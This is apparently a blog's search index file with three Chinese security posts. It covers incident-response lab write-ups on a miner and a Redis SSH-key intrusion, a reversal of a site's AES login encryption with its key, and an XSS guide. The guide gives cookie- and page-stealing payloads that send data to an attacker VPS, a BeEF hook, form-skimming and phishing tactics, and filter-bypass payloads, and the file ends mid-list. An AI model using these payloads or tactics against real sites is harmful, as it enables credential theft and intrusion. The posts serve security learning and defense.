<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>应急响应靶场练习</title>
      <link href="/2024/04/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/04/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="应急响应靶场练习"><a href="#应急响应靶场练习" class="headerlink" title="应急响应靶场练习"></a>应急响应靶场练习</h1><h2 id="windows应急-1"><a href="#windows应急-1" class="headerlink" title="windows应急 1"></a>windows应急 1</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景:"></a>背景:</h3><p>小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件</p><p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名(仅域名)<br>5.有实力的可以尝试着修复漏洞</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>进去有点卡顿 查看一下CPU占用率resmon(cmd)<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20001.png" alt="title"><br>cpu占用率100% 怀疑有挖矿病毒<br>但是过一会后发现CPU占用率降下来了(emmm可能题目环境有问题)</p><p>不管了 先对主机进行信息搜集一波</p><h3 id="检查进程"><a href="#检查进程" class="headerlink" title="检查进程"></a>检查进程</h3><ul><li>查一下主机开的端口和外联的进程<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20002.png" alt="title"><br>  emm,没有找的可疑的进程(猜测是题目环境原因)<br>  唯一得到的信息是本机开放了80 135(RPC) 445(smb)端口 3306(mysql) (查进程应该是最好搜集信息的)</li></ul><h3 id="查自启动项和计划任务"><a href="#查自启动项和计划任务" class="headerlink" title="查自启动项和计划任务"></a>查自启动项和计划任务</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20003.png" alt="title"><br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20004.png" alt="title"><br>没什么问题</p><h3 id="检查最近打开文件"><a href="#检查最近打开文件" class="headerlink" title="检查最近打开文件"></a>检查最近打开文件</h3><p>利用LastActivityView工具<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20005.png" alt="title"><br>发现恶意程序kuang.exe和隐藏用户hack$<br>上传kuang.exe到云沙箱<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20006.png" alt="title"><br>靶场原因不外联<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20007.png" alt="title"><br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20008.png" alt="title"><br>通过pyd后缀和打包工具确定是python做的免杀</p><h3 id="检查web服务"><a href="#检查web服务" class="headerlink" title="检查web服务"></a>检查web服务</h3><ul><li><p>查看web日志<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20009.png" alt="title"><br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20010.png" alt="title"><br>  发现黑客的IP 192.168.126.1(内网横向)和shell文件位置 时间在2.26<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20011.png" alt="title"><br>  大量的请求 猜测是暴力破解攻击</p></li><li><p>然后D盾查杀网站根目录<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20012.png" alt="title"></p></li><li><p>备份分析，删除shell.php<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20013.png" alt="title"><br>  冰蝎的标配php后门 连接密码rebeyond</p></li></ul><h3 id="检查其他服务的日志"><a href="#检查其他服务的日志" class="headerlink" title="检查其他服务的日志"></a>检查其他服务的日志</h3><p>用windows1check一键分析</p><ul><li>远程桌面日志<br>  <img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20014.png" alt="title"></li></ul><h3 id="检查注册表"><a href="#检查注册表" class="headerlink" title="检查注册表"></a>检查注册表</h3><ul><li><p>检查隐藏账户(D盾)<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20015.png" alt="title"><br>发现隐藏账户hack168$ 用D盾删除即可</p></li><li><p>检查映像挂载(Autoruns)<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20016.png" alt="title"><br>没有映像挂载</p></li></ul><h3 id="检查hosts"><a href="#检查hosts" class="headerlink" title="检查hosts"></a>检查hosts</h3><p><code>C:\Windows\System32\drivers\etc\hosts</code></p><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20017.png" alt="title"><br>hosts没有被修改</p><h3 id="梳理思路"><a href="#梳理思路" class="headerlink" title="梳理思路"></a>梳理思路</h3><p>虽然没有挖矿进程 但是通过web日志和时间进行分析<br>可以得到挖矿程序被创建的时间 然后通过everything搜索<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20018.png" alt="title"><br>可以确定Kuang.exe是挖矿程序</p><ul><li>红队攻击思路猜测:<br>暴破弱口令进入后台-&gt;上传webshell命令执行-&gt;提权-&gt;挖矿</li></ul><h3 id="挖矿程序分析"><a href="#挖矿程序分析" class="headerlink" title="挖矿程序分析"></a>挖矿程序分析</h3><p>直接用pyinstxtractor 反编译<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20019.png" alt="title"><br>然后把pyc文件拖到pyc在线反编译平台得到源码</p><p>Kuang.pyc</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpu_intensive_task</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">&#x27;http://wakuang.zhigongshanfang.top&#x27;</span>, <span class="number">10</span>, **(<span class="string">&#x27;timeout&#x27;</span>,))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    cpu_count = multiprocessing.cpu_count()</span><br><span class="line">    processes = (<span class="keyword">lambda</span> <span class="number">.0</span>: [ multiprocessing.Process(cpu_intensive_task, **(<span class="string">&#x27;target&#x27;</span>,)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(cpu_count))</span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.start()</span><br><span class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> processes:</span><br><span class="line">        process.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到矿池域名 wakuang.zhigongshanfang.top</p><h2 id="本题总结"><a href="#本题总结" class="headerlink" title="本题总结"></a>本题总结</h2><p>hack没做好权限维持，比较容易发现，题目环境有点问题，实际的挖矿应急会更加复杂和更加困难</p><p>经验总结: 应该提前把工具打包好 然后一次性放进去 做题的时候一个个打包然后放进去 有点麻烦</p><h2 id="linux应急"><a href="#linux应急" class="headerlink" title="linux应急"></a>linux应急</h2><h3 id="背景-1"><a href="#背景-1" class="headerlink" title="背景"></a>背景</h3><p>小王急匆匆地找到小张，小王说”李哥，我dev服务器被黑了”,快救救我！！</p><p>挑战内容：</p><p>黑客的IP地址</p><p>遗留下的三个flag</p><h3 id="查看CPU占用-top"><a href="#查看CPU占用-top" class="headerlink" title="查看CPU占用(top)"></a>查看CPU占用(top)</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20020.png" alt="title"><br>CPU占用不高，排除病毒</p><h3 id="查看网络行为-netstat-antop"><a href="#查看网络行为-netstat-antop" class="headerlink" title="查看网络行为(netstat -antop)"></a>查看网络行为(netstat -antop)</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20022.png" alt="title"><br>无外联</p><h3 id="查看历史命令-进入用户目录-cat-bash-history"><a href="#查看历史命令-进入用户目录-cat-bash-history" class="headerlink" title="查看历史命令(进入用户目录 cat .bash_history)"></a>查看历史命令(进入用户目录 cat .bash_history)</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20021.png" alt="title"><br>发现 hacker执行了 chmod 命令给 &#x2F;etc&#x2F;rc.d&#x2F;rc.local 添加了执行权限 并且修改了该文件<br>&#x2F;etc&#x2F;rc.d&#x2F;rc.local 是 开机启动项的管理文件</p><h3 id="查开机自启动"><a href="#查开机自启动" class="headerlink" title="查开机自启动"></a>查开机自启动</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20023.png" alt="title"></p><h3 id="查看计划任务-crontab-l"><a href="#查看计划任务-crontab-l" class="headerlink" title="查看计划任务(crontab -l)"></a>查看计划任务(crontab -l)</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20024.png" alt="title"><br>无计划任务</p><h3 id="查看异常账户"><a href="#查看异常账户" class="headerlink" title="查看异常账户"></a>查看异常账户</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20025.png" alt="title"><br>无可疑账户,发现了一个redis账户，说明这个服务器上应该有redis服务，但是redis端口6379又未开放，等会可以试试打开redis服务然后测试未授权</p><h3 id="查看ssh登录日志"><a href="#查看ssh登录日志" class="headerlink" title="查看ssh登录日志"></a>查看ssh登录日志</h3><p><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20026.png" alt="title"><br>得到hacker的IP地址 192.168.75.129</p><h3 id="redis未授权测试"><a href="#redis未授权测试" class="headerlink" title="redis未授权测试"></a>redis未授权测试</h3><p>启动redis服务 <code>redis-sever</code><br>然后登录redis<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20027.png" alt="title"><br>未授权登录成功</p><p>查看redis登录日志 cat &#x2F;var&#x2F;redis&#x2F;redis.log<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20028.png" alt="title"><br>发现攻击者登录</p><p>redis未授权访问的常见利用有三种：</p><ul><li>写webshell </li><li>写ssh公钥</li><li>写计划任务</li></ul><p>结合之前ssh登录的日志，应该是通过写ssh公钥利用<br>进入 &#x2F;root&#x2F;.ssh&#x2F;<br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20029.png" alt="title"><br>发现kali的公钥</p><h3 id="攻击流程复现"><a href="#攻击流程复现" class="headerlink" title="攻击流程复现"></a>攻击流程复现</h3><p>redis未授权写ssh公钥 -&gt; ssh登录 </p><p>然后这道题还有一个flag没有找到，看题解，在redis的配置文件里面</p><p><code>cat /etc/redis.conf</code><br><img src="/img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/20030.png" alt="title"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习通登录JS逆向</title>
      <link href="/2024/03/21/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/"/>
      <url>/2024/03/21/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h1><h2 id="抓取登录包"><a href="#抓取登录包" class="headerlink" title="抓取登录包"></a>抓取登录包</h2><p><img src="/img/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/1.png" alt="title"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li>登录包里面有<code>uname</code>和<code>password</code>都是base64编码后的放入解密网站里面解出来为乱码,说明应该有别的加密</li><li>追踪一下源码(看js调用)<br>  <img src="/img/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/2.png" alt="title"><br>  找到js加密,发现是AES加密,并且key给了出来<br>  <img src="/img/%E5%AD%A6%E4%B9%A0%E9%80%9A%E7%99%BB%E5%BD%95Js%E9%80%86%E5%90%91/3.png" alt="title"><br>  然后追踪一下其自定义的encryptByAES函数</li></ul><h2 id="AES加密代码"><a href="#AES加密代码" class="headerlink" title="AES加密代码"></a>AES加密代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encryptByAES</span>(<span class="params">message, key</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">CBCOptions</span> = &#123;  </span><br><span class="line"><span class="attr">iv</span>: <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(key),   <span class="comment">// 偏移量iv</span></span><br><span class="line"><span class="attr">mode</span>:<span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span>,             <span class="comment">// AES 模式</span></span><br><span class="line"><span class="attr">padding</span>: <span class="title class_">CryptoJS</span>.<span class="property">pad</span>.<span class="property">Pkcs7</span>         <span class="comment">// AES 填充方式</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> aeskey = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(key);  <span class="comment">// 将key编码为 utf-8 然后赋值给 AESkey</span></span><br><span class="line"><span class="keyword">let</span> secretData = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(message); <span class="comment">// 将message编码为 utf-8 然后赋值给 secretData</span></span><br><span class="line"><span class="keyword">let</span> encrypted = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(       <span class="comment">// AES 加密 后赋值给encrypted</span></span><br><span class="line">secretData,                             </span><br><span class="line">aeskey,</span><br><span class="line"><span class="title class_">CBCOptions</span>                              </span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">stringify</span>(encrypted.<span class="property">ciphertext</span>); <span class="comment">// base64 编码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写python解密脚本"><a href="#编写python解密脚本" class="headerlink" title="编写python解密脚本"></a>编写python解密脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryptByAES</span>(<span class="params">base64_msg, key</span>):</span><br><span class="line">    <span class="comment"># 将Base64编码的密文解码为字节</span></span><br><span class="line">    base64_decode_msg = b64decode(base64_msg)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个新的AES对象</span></span><br><span class="line">    cipher = AES.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.MODE_CBC, IV=key.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密密文</span></span><br><span class="line">    aes_decode_msg = unpad(cipher.decrypt(base64_decode_msg), AES.block_size)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将字节解码为字符串</span></span><br><span class="line">    raw_msg = aes_decode_msg.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> raw_msg</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;u2oh6Vu^HWe4_AES&quot;</span></span><br><span class="line">msg = <span class="string">&quot;47leAZ1BfFA1xXYbIXaALw==&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decryptByAES(msg, key))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> JS </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站总结</title>
      <link href="/2024/03/11/XSS%E8%B7%A8%E7%AB%99%E6%80%BB%E7%BB%93/"/>
      <url>/2024/03/11/XSS%E8%B7%A8%E7%AB%99%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是XSS攻击"><a href="#什么是XSS攻击" class="headerlink" title="什么是XSS攻击"></a>什么是XSS攻击</h1><p>XSS（Cross Site Scripting）攻击，也称为跨站脚本攻击，是一种常见的网络攻击方式。其原理是恶意攻击者往Web页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中Web里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的</p><p>tips: 产生在前端的攻击</p><h1 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h1><h2 id="反射型-非持久型"><a href="#反射型-非持久型" class="headerlink" title="反射型(非持久型)"></a>反射型(非持久型)</h2><p>攻击代码并未存储在目标服务器上，而是通过URL或其他方式传递给用户。当用户点击包含恶意脚本的链接时，恶意脚本会被执行。</p><p>tips: 反射型xss需要人去点击，危害不大，想要扩大危害通常会结合社工钓鱼使用</p><h2 id="存储型-持久型"><a href="#存储型-持久型" class="headerlink" title="存储型(持久型)"></a>存储型(持久型)</h2><p>攻击代码存储在目标服务器上，当用户访问页面时，服务器会将存储的恶意脚本一同发送给用户，从而在用户的浏览器中执行。</p><p>tips: 这种攻击通常发生在用户可以提交数据并被其他用户查看的场景，例如论坛、博客、留言板等</p><p>利用: 一般发现存储型xss可以结合BeEF平台进行钓鱼利用</p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>一种基于文档对象模型的跨站脚本攻击。这种攻击通常发生在Web应用程序将数据写入DOM时，如果没有进行适当的清理和转义，攻击者就可以操纵这些数据，包括在网页上插入恶意的JavaScript代码。</p><p>tips: DOM型只涉及到前端JS,其他型会涉及到后端</p><h2 id="mXSS-突变型"><a href="#mXSS-突变型" class="headerlink" title="mXSS(突变型)"></a>mXSS(突变型)</h2><p>原先的payload不会产生危害,但是由于一些特殊原因,如反编码等,导致payload变异,产生危害<br>如: 本来无害的带有payload的url 通过qq转发 或者一些软件自带的预览功能 产生XSS</p><h2 id="uXSS"><a href="#uXSS" class="headerlink" title="uXSS"></a>uXSS</h2><p>uXSS是利用浏览器或者浏览器扩展漏洞产生XSS并且执行代码的一种攻击类型</p><h2 id="flashXSS"><a href="#flashXSS" class="headerlink" title="flashXSS"></a>flashXSS</h2><p>攻击的原理是利用Flash文件(.swf)可以调用JavaScript的函数,如果这些函数使用不当，就可能导致XSS攻击。</p><h3 id="挖掘"><a href="#挖掘" class="headerlink" title="挖掘"></a>挖掘</h3><p>一般可以通过JPEXS工具去反编译.swf文件然后查找可以调用JS危险函数: getURL，navigateToURL，ExternalInterface.call(常见)，htmlText，loadMovie等<br>看这些函数的参数是否可控制,从而实现XSS攻击</p><p>tips: 一般网游和影视网站等调用flash的多,出现此漏洞概率大</p><h2 id="pdfXSS"><a href="#pdfXSS" class="headerlink" title="pdfXSS"></a>pdfXSS</h2><p>利用pdf文件可以调用JS的功能,向pdf文件中插入恶意JS代码,如果用户使用浏览器打开pdf文件,就会执行恶意代码,一般会使用比较会让人信赖的平台(前提是这个平台没有对此类文件进行过滤)去上传此类pdf文件然后让受害者去直连访问,一般结合钓鱼使用</p><h2 id="其他XSS"><a href="#其他XSS" class="headerlink" title="其他XSS"></a>其他XSS</h2><p>如: UTF-7XSS MHTMLXSS CSSXSS VBScriptXSS 利用条件过老(需要IE浏览器低版本) </p><h1 id="XSS的利用"><a href="#XSS的利用" class="headerlink" title="XSS的利用"></a>XSS的利用</h1><h2 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h2><ol><li>获取cookie</li></ol><p><code>&lt;script&gt;window.location.href=&#39;http://&lt;vps的ip&gt;:&lt;端口&gt;/&lt;api接口&gt;?&lt;参数名&gt;=&#39; + document.cookie&lt;/script&gt;</code></p><ol start="2"><li>当获取cookie没用的时候(cookie只能用一次或者其他情况),可以试试获取管理员登录时候的网页源码</li></ol><p><code>&lt;script&gt;window.location.href=&#39;http://&lt;vps的ip&gt;:&lt;端口&gt;/&lt;api接口&gt;?&lt;参数名&gt;=&#39; + document.documentElement.outerHTML&lt;/script&gt;</code></p><h2 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h2><p>BeEF-XSS 工具:</p><ol><li>向服务器上传XSS恶意代码 <code>&lt;script src=&quot;http:// &lt;vps的ip&gt; : &lt;BeEF端口&gt; /hook.js&quot;&gt;&lt;/script&gt;</code></li><li>只要有人访问便可成功上线BeEF,然后可以进行各种操作,钓鱼,拿cookie登录后台(这种方式只限制于cookie单一验证,或者是无防护的情况)</li></ol><h2 id="XSS权限维持"><a href="#XSS权限维持" class="headerlink" title="XSS权限维持"></a>XSS权限维持</h2><p>拿到webshell后,一般都会上传木马,但是木马一般会被查杀软件检测,但是js代码却不会,所以可以在web服务的源码中插入js代码(前提是关闭CSP,一般在配置文件中(全局配置),和对应源代码(单独文件设置)),然后使用BeEF等工具进行攻击</p><p>tips: 可以在提交表单处(输入账号密码)插入js去得到别人输入的账号密码(cookie劫持不管用,数据库储存的密码是密文的时候特别管用)</p><h2 id="XSS配合钓鱼"><a href="#XSS配合钓鱼" class="headerlink" title="XSS配合钓鱼"></a>XSS配合钓鱼</h2><p>可以用一些常规软件然后捆绑实现钓鱼,这里用flash来举例子</p><ol><li>域名伪造 flash可以用f1ash去代替创建域名 或者 用在线网站创建一个短链接 </li><li>扒下原安装页面的的源码 然后修改 将文件下载的路径改成后门下载路径 </li><li>后门免杀和伪装</li><li>语言诱导,可以用好奇心去诱导(某主播视频流出,或者是什么吃瓜的东西)或者用XSS去提示跳转</li></ol><h2 id="XSS配合CSRF"><a href="#XSS配合CSRF" class="headerlink" title="XSS配合CSRF"></a>XSS配合CSRF</h2><p>如果目标网站存在可以在在线状态访问一个url达到重置密码的效果(CSRF),就可以配合存储型XSS跳转到这个URL去实现重置管理员的用户密码(在管理员登录的时候)</p><h2 id="XSS配合浏览器漏洞上线网马"><a href="#XSS配合浏览器漏洞上线网马" class="headerlink" title="XSS配合浏览器漏洞上线网马"></a>XSS配合浏览器漏洞上线网马</h2><ol><li>msf生成浏览器网马(如:ms14_064_ole_code_execution 只适用于IE内核浏览器 操作系统通常为winxp win7,如果后续有可以利用的浏览器可以替代)</li><li>然后用xss工具去跳转访问浏览器网马的url 访问及上线</li></ol><h2 id="XSS的常见绕过"><a href="#XSS的常见绕过" class="headerlink" title="XSS的常见绕过"></a>XSS的常见绕过</h2><ol><li><p>script标签被过滤: 使用其他标签如img标签,input标签等等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt; //仅限于IE</span><br><span class="line"></span><br><span class="line">&lt;body</span><br><span 